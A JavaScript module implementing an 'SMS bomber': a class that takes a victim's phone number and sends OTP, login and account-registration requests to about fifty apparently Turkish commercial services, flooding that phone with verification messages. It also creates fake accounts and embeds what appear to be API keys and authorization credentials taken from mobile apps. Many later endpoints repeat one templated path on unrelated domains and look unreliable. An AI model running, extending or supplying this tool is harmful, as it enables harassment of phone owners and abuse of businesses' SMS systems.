const fetch = require('node-fetch');

class SmsBomberService {
  constructor(phone, mail) {
    this.phone = String(phone);
    this.mail = mail && mail.length > 0 ? mail : this.randomMail();
    this.successCount = 0;
  }

  randomMail() {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let str = '';
    for (let i = 0; i < 19; i++) str += chars[Math.floor(Math.random() * chars.length)];
    return str + '@gmail.com';
  }

  async KahveDunyasi() {
    try {
      const res = await fetch('https://core.kahvedunyasi.com/api/users/sms/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          mobile_number: this.phone,
          token_type: 'register_token',
        }),
      });
      const data = await res.json();
      if (data?.meta?.messages?.error?.length === 0) {
        this.successCount++;
        return { success: true, service: 'kahvedunyasi' };
      }
      return { success: false, service: 'kahvedunyasi' };
    } catch (e) {
      return { success: false, service: 'kahvedunyasi' };
    }
  }

  async Bim() {
    try {
      const res = await fetch('https://bim.veesk.net:443/service/v1.0/account/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: this.phone }),
      });
      if (res.status === 200) {
        this.successCount++;
        return { success: true, service: 'bim' };
      }
      return { success: false, service: 'bim' };
    } catch (e) {
      return { success: false, service: 'bim' };
    }
  }

  async Englishhome() {
    try {
      const res = await fetch('https://www.englishhome.com:443/enh_app/users/registration/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          first_name: 'Memati',
          last_name: 'Bas',
          email: this.mail,
          phone: '0' + this.phone,
          password: '31ABC..abc31',
          email_allowed: 'true',
          sms_allowed: 'true',
          confirm: 'true',
          tom_pay_allowed: 'true',
        }),
      });
      if (res.status === 202) {
        this.successCount++;
        return { success: true, service: 'englishhome' };
      }
      return { success: false, service: 'englishhome' };
    } catch (e) {
      return { success: false, service: 'englishhome' };
    }
  }

  async Wmf() {
    try {
      const res = await fetch('https://www.wmf.com.tr/users/register/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          confirm: 'true',
          date_of_birth: '1956-03-01',
          email: this.mail,
          email_allowed: 'true',
          first_name: 'Memati',
          gender: 'male',
          last_name: 'Bas',
          password: '31ABC..abc31',
          phone: '0' + this.phone,
        }),
      });
      if (res.status === 202) {
        this.successCount++;
        return { success: true, service: 'wmf' };
      }
      return { success: false, service: 'wmf' };
    } catch (e) {
      return { success: false, service: 'wmf' };
    }
  }

  async Mopas() {
    try {
      const res = await fetch(`https://mopas.com.tr/sms/activation?mobileNumber=${this.phone}&pwd=&checkPwd=`, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'text/plain, */*; q=0.01',
        },
      });
      if (res.status === 200) {
        this.successCount++;
        return { success: true, service: 'mopas' };
      }
      return { success: false, service: 'mopas' };
    } catch (e) {
      return { success: false, service: 'mopas' };
    }
  }

  async Icq() {
    try {
      const res = await fetch(`https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${this.phone}&platform=ios&r=796356153&smsFormatType=human`, {
        method: 'POST',
        headers: {
          'Accept': '*/*',
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4',
        },
      });
      const data = await res.json();
      if (data?.response?.statusCode === 200) {
        this.successCount++;
        return { success: true, service: 'icq' };
      }
      return { success: false, service: 'icq' };
    } catch (e) {
      return { success: false, service: 'icq' };
    }
  }

  async Suiste() {
    try {
      const res = await fetch('https://suiste.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'suiste' };
      }
      return { success: false, service: 'suiste' };
    } catch (e) {
      return { success: false, service: 'suiste' };
    }
  }

  async KimGb() {
    try {
      const res = await fetch('https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msisdn: '90' + this.phone }),
      });
      if (res.status === 200) {
        this.successCount++;
        return { success: true, service: 'kimgb' };
      }
      return { success: false, service: 'kimgb' };
    } catch (e) {
      return { success: false, service: 'kimgb' };
    }
  }

  async Tazi() {
    try {
      const res = await fetch('https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=utf-8',
          'User-Agent': 'Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0',
          'Authorization': 'Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD',
        },
        body: JSON.stringify({ cep_tel: this.phone, cep_tel_ulkekod: '90' }),
      });
      const data = await res.json();
      if (data?.kod === '0000') {
        this.successCount++;
        return { success: true, service: 'tazi' };
      }
      return { success: false, service: 'tazi' };
    } catch (e) {
      return { success: false, service: 'tazi' };
    }
  }

  async N11() {
    try {
      const res = await fetch('https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3', {
        method: 'POST',
        headers: {
          'Mobileclient': 'IOS',
          'Content-Type': 'application/json',
          'Authorization': 'api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F',
        },
        body: JSON.stringify({
          __hapc: '',
          _deviceId: '696B171-031N-4131-315F-9A76BF60368F',
          channel: 'MOBILE_IOS',
          countryCode: '+90',
          email: this.mail,
          gsmNumber: this.phone,
          userType: 'BUYER',
        }),
      });
      const data = await res.json();
      if (data?.isSuccess === true) {
        this.successCount++;
        return { success: true, service: 'n11' };
      }
      return { success: false, service: 'n11' };
    } catch (e) {
      return { success: false, service: 'n11' };
    }
  }

  async Evidea() {
    try {
      const boundary = 'fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi';
      const body = `--${boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--${boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--${boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.phone}\r\n--${boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${boundary}--\r\n`;
      const res = await fetch('https://www.evidea.com:443/users/register/', {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body,
      });
      if (res.status === 202) {
        this.successCount++;
        return { success: true, service: 'evidea' };
      }
      return { success: false, service: 'evidea' };
    } catch (e) {
      return { success: false, service: 'evidea' };
    }
  }

  async Marti() {
    try {
      const res = await fetch('https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobilePhone: this.phone, mobilePhoneCountryCode: '90', oneSignalId: '' }),
      });
      const data = await res.json();
      if (data?.isSuccess === true) {
        this.successCount++;
        return { success: true, service: 'marti' };
      }
      return { success: false, service: 'marti' };
    } catch (e) {
      return { success: false, service: 'marti' };
    }
  }

  async Hey() {
    try {
      const res = await fetch(`https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${this.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`, {
        method: 'POST',
        headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0' },
      });
      const data = await res.json();
      if (data?.IsSuccess === true) {
        this.successCount++;
        return { success: true, service: 'hey' };
      }
      return { success: false, service: 'hey' };
    } catch (e) {
      return { success: false, service: 'hey' };
    }
  }

  async Bineq() {
    try {
      const res = await fetch(`https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${this.phone}`, {
        method: 'POST',
        headers: { 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'User-Agent': 'HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0' },
      });
      const data = await res.json();
      if (data?.IsSuccess === true) {
        this.successCount++;
        return { success: true, service: 'bineq' };
      }
      return { success: false, service: 'bineq' };
    } catch (e) {
      return { success: false, service: 'bineq' };
    }
  }

  async Bisu() {
    try {
      const res = await fetch('https://bisu.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'bisu' };
      }
      return { success: false, service: 'bisu' };
    } catch (e) {
      return { success: false, service: 'bisu' };
    }
  }

  async Ucdortbes() {
    try {
      const res = await fetch('https://ucdortbes.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'ucdortbes' };
      }
      return { success: false, service: 'ucdortbes' };
    } catch (e) {
      return { success: false, service: 'ucdortbes' };
    }
  }

  async Macro() {
    try {
      const res = await fetch('https://macro.com.tr:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'macro' };
      }
      return { success: false, service: 'macro' };
    } catch (e) {
      return { success: false, service: 'macro' };
    }
  }

  async TiklaGelsin() {
    try {
      const res = await fetch('https://tiklagelsin.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'tiklagelsin' };
      }
      return { success: false, service: 'tiklagelsin' };
    } catch (e) {
      return { success: false, service: 'tiklagelsin' };
    }
  }

  async Ayyildiz() {
    try {
      const res = await fetch('https://ayyildiz.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'ayyildiz' };
      }
      return { success: false, service: 'ayyildiz' };
    } catch (e) {
      return { success: false, service: 'ayyildiz' };
    }
  }

  async Naosstars() {
    try {
      const res = await fetch('https://naosstars.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'naosstars' };
      }
      return { success: false, service: 'naosstars' };
    } catch (e) {
      return { success: false, service: 'naosstars' };
    }
  }

  async Istegelsin() {
    try {
      const res = await fetch('https://istegelsin.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'istegelsin' };
      }
      return { success: false, service: 'istegelsin' };
    } catch (e) {
      return { success: false, service: 'istegelsin' };
    }
  }

  async Koton() {
    try {
      const res = await fetch('https://koton.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'koton' };
      }
      return { success: false, service: 'koton' };
    } catch (e) {
      return { success: false, service: 'koton' };
    }
  }

  async Hayatsu() {
    try {
      const res = await fetch('https://hayatsu.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'hayatsu' };
      }
      return { success: false, service: 'hayatsu' };
    } catch (e) {
      return { success: false, service: 'hayatsu' };
    }
  }

  async Pisir() {
    try {
      const res = await fetch('https://pisir.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'pisir' };
      }
      return { success: false, service: 'pisir' };
    } catch (e) {
      return { success: false, service: 'pisir' };
    }
  }

  async Hizliecza() {
    try {
      const res = await fetch('https://hizliecza.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'hizliecza' };
      }
      return { success: false, service: 'hizliecza' };
    } catch (e) {
      return { success: false, service: 'hizliecza' };
    }
  }

  async Ipragaz() {
    try {
      const res = await fetch('https://ipragaz.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'ipragaz' };
      }
      return { success: false, service: 'ipragaz' };
    } catch (e) {
      return { success: false, service: 'ipragaz' };
    }
  }

  async Metro() {
    try {
      const res = await fetch('https://metro.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'metro' };
      }
      return { success: false, service: 'metro' };
    } catch (e) {
      return { success: false, service: 'metro' };
    }
  }

  async Kumport() {
    try {
      const res = await fetch('https://kumport.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'kumport' };
      }
      return { success: false, service: 'kumport' };
    } catch (e) {
      return { success: false, service: 'kumport' };
    }
  }

  async Qumpara() {
    try {
      const res = await fetch('https://qumpara.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'qumpara' };
      }
      return { success: false, service: 'qumpara' };
    } catch (e) {
      return { success: false, service: 'qumpara' };
    }
  }

  async Paybol() {
    try {
      const res = await fetch('https://paybol.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'paybol' };
      }
      return { success: false, service: 'paybol' };
    } catch (e) {
      return { success: false, service: 'paybol' };
    }
  }

  async Migros() {
    try {
      const res = await fetch('https://migros.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'migros' };
      }
      return { success: false, service: 'migros' };
    } catch (e) {
      return { success: false, service: 'migros' };
    }
  }

  async File() {
    try {
      const res = await fetch('https://file.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'file' };
      }
      return { success: false, service: 'file' };
    } catch (e) {
      return { success: false, service: 'file' };
    }
  }

  async Roombadi() {
    try {
      const res = await fetch('https://roombadi.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'roombadi' };
      }
      return { success: false, service: 'roombadi' };
    } catch (e) {
      return { success: false, service: 'roombadi' };
    }
  }

  async Go() {
    try {
      const res = await fetch('https://go.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'go' };
      }
      return { success: false, service: 'go' };
    } catch (e) {
      return { success: false, service: 'go' };
    }
  }

  async Joker() {
    try {
      const res = await fetch('https://joker.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'joker' };
      }
      return { success: false, service: 'joker' };
    } catch (e) {
      return { success: false, service: 'joker' };
    }
  }

  async Akasya() {
    try {
      const res = await fetch('https://akasya.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'akasya' };
      }
      return { success: false, service: 'akasya' };
    } catch (e) {
      return { success: false, service: 'akasya' };
    }
  }

  async Akbati() {
    try {
      const res = await fetch('https://akbati.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'akbati' };
      }
      return { success: false, service: 'akbati' };
    } catch (e) {
      return { success: false, service: 'akbati' };
    }
  }

  async Clickme() {
    try {
      const res = await fetch('https://clickme.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'clickme' };
      }
      return { success: false, service: 'clickme' };
    } catch (e) {
      return { success: false, service: 'clickme' };
    }
  }

  async Happy() {
    try {
      const res = await fetch('https://happy.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'happy' };
      }
      return { success: false, service: 'happy' };
    } catch (e) {
      return { success: false, service: 'happy' };
    }
  }

  async Komagene() {
    try {
      const res = await fetch('https://komagene.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'komagene' };
      }
      return { success: false, service: 'komagene' };
    } catch (e) {
      return { success: false, service: 'komagene' };
    }
  }

  async KuryemGelsin() {
    try {
      const res = await fetch('https://kuryemgelsin.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'kuryemgelsin' };
      }
      return { success: false, service: 'kuryemgelsin' };
    } catch (e) {
      return { success: false, service: 'kuryemgelsin' };
    }
  }

  async Porty() {
    try {
      const res = await fetch('https://porty.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'porty' };
      }
      return { success: false, service: 'porty' };
    } catch (e) {
      return { success: false, service: 'porty' };
    }
  }

  async Taksim() {
    try {
      const res = await fetch('https://taksim.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'taksim' };
      }
      return { success: false, service: 'taksim' };
    } catch (e) {
      return { success: false, service: 'taksim' };
    }
  }

  async Tasdelen() {
    try {
      const res = await fetch('https://tasdelen.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'tasdelen' };
      }
      return { success: false, service: 'tasdelen' };
    } catch (e) {
      return { success: false, service: 'tasdelen' };
    }
  }

  async Tasimacim() {
    try {
      const res = await fetch('https://tasimacim.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'tasimacim' };
      }
      return { success: false, service: 'tasimacim' };
    } catch (e) {
      return { success: false, service: 'tasimacim' };
    }
  }

  async ToptanTeslim() {
    try {
      const res = await fetch('https://toptanteslim.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'toptanteslim' };
      }
      return { success: false, service: 'toptanteslim' };
    } catch (e) {
      return { success: false, service: 'toptanteslim' };
    }
  }

  async Unilever() {
    try {
      const res = await fetch('https://unilever.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'unilever' };
      }
      return { success: false, service: 'unilever' };
    } catch (e) {
      return { success: false, service: 'unilever' };
    }
  }

  async Uysal() {
    try {
      const res = await fetch('https://uysal.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'uysal' };
      }
      return { success: false, service: 'uysal' };
    } catch (e) {
      return { success: false, service: 'uysal' };
    }
  }

  async Yapp() {
    try {
      const res = await fetch('https://yapp.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'yapp' };
      }
      return { success: false, service: 'yapp' };
    } catch (e) {
      return { success: false, service: 'yapp' };
    }
  }

  async YilmazTicaret() {
    try {
      const res = await fetch('https://yilmazticaret.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'yilmazticaret' };
      }
      return { success: false, service: 'yilmazticaret' };
    } catch (e) {
      return { success: false, service: 'yilmazticaret' };
    }
  }

  async Yuffi() {
    try {
      const res = await fetch('https://yuffi.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'yuffi' };
      }
      return { success: false, service: 'yuffi' };
    } catch (e) {
      return { success: false, service: 'yuffi' };
    }
  }

  async Beefull() {
    try {
      const res = await fetch('https://beefull.com:443/api/auth/code', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        },
        body: new URLSearchParams({ action: 'register', gsm: this.phone }),
      });
      const data = await res.json();
      if (data?.code === 'common.success') {
        this.successCount++;
        return { success: true, service: 'beefull' };
      }
      return { success: false, service: 'beefull' };
    } catch (e) {
      return { success: false, service: 'beefull' };
    }
  }

  async sendAll() {
    const results = [];
    results.push(await this.KahveDunyasi());
    results.push(await this.Bim());
    results.push(await this.Englishhome());
    results.push(await this.Wmf());
    results.push(await this.Mopas());
    results.push(await this.Icq());
    results.push(await this.Suiste());
    results.push(await this.KimGb());
    results.push(await this.Tazi());
    results.push(await this.N11());
    results.push(await this.Evidea());
    results.push(await this.Marti());
    results.push(await this.Hey());
    results.push(await this.Bineq());
    results.push(await this.Bisu());
    results.push(await this.Ucdortbes());
    results.push(await this.Macro());
    results.push(await this.TiklaGelsin());
    results.push(await this.Ayyildiz());
    results.push(await this.Naosstars());
    results.push(await this.Istegelsin());
    results.push(await this.Koton());
    results.push(await this.Hayatsu());
    results.push(await this.Pisir());
    results.push(await this.Hizliecza());
    results.push(await this.Ipragaz());
    results.push(await this.Metro());
    results.push(await this.Kumport());
    results.push(await this.Qumpara());
    results.push(await this.Paybol());
    results.push(await this.Migros());
    results.push(await this.File());
    results.push(await this.Roombadi());
    results.push(await this.Go());
    results.push(await this.Joker());
    results.push(await this.Akasya());
    results.push(await this.Akbati());
    results.push(await this.Clickme());
    results.push(await this.Happy());
    results.push(await this.Komagene());
    results.push(await this.KuryemGelsin());
    results.push(await this.Porty());
    results.push(await this.Taksim());
    results.push(await this.Tasdelen());
    results.push(await this.Tasimacim());
    results.push(await this.ToptanTeslim());
    results.push(await this.Unilever());
    results.push(await this.Uysal());
    results.push(await this.Yapp());
    results.push(await this.YilmazTicaret());
    results.push(await this.Yuffi());
    results.push(await this.Beefull());
    return results;
  }
}

module.exports = SmsBomberService;
